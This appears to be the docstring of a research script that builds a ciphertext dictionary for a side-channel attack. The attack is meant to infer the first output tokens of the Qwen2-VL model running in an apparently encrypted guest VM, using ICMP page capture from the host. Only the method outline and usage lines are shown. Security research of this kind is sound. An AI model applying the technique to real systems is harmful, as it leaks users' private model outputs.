#!/usr/bin/env python3
"""
output_orchestrate.py — Dictionary build for first-output-token side-channel.

Targets the first N output tokens generated by Qwen2-VL.
Uses the same ICMP-page-capture mechanism as orchestrate_v2.py.

Phase 0 (pre-build, run once):
  For each target output token sequence (first generated word):
    send ICMP with prefix alignment → get GPA → dump ciphertext
  Saves output_dict_cache.json + individual *.out files in output_dict_pages/.

  Principle is identical to orchestrate_v2.py build_dict:
    payload = b'\x00' * prefix + (token_bytes repeated to fill 4 KB+)
    guest module reports GPA of the page holding the data
    host captures ciphertext → stored by (token_offset, token_idx)

Usage:
    sudo python3 output_orchestrate.py --print-token-ids   # run on guest first
    sudo python3 output_orchestrate.py --build
    sudo python3 output_orchestrate.py --build --log-file build_output.log
"""

